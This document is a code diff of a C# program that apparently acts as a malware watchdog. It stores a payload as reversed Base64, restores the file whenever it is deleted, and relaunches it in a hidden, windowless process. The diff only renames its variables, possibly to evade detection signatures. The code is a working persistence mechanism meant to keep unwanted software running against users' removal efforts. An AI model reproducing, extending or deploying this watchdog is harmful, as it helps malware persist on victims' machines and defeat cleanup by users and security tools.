@@ -22,16 +22,16 @@ using System.Windows.Forms;
 
 public partial class Program
 {
-    public static string xm = "";
-    public static string plp = "";
+    public static string rxM = "";
+    public static string rplp = "";
     public static int checkcount = 0;
 
     public static void Main()
     {
         try
         {
-            plp = PayloadPath;
-            xm = Convert.ToBase64String(File.ReadAllBytes(plp).Reverse().ToArray());
+            rplp = PayloadPath;
+            rxM = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
             RWDLoop();
         }
         catch (Exception ex)
@@ -49,12 +49,12 @@ public partial class Program
         {
             if (!RCheckProc())
             {
-                if (!File.Exists(plp))
+                if (!File.Exists(rplp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(xm).Reverse().ToArray());
+                    File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
@@ -68,7 +68,7 @@ public partial class Program
                     checkcount = 0;
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
@@ -77,12 +77,12 @@ public partial class Program
             else
             {
                 checkcount = 0;
-                if (!File.Exists(plp))
+                if (!File.Exists(rplp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(xm).Reverse().ToArray());
+                    File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
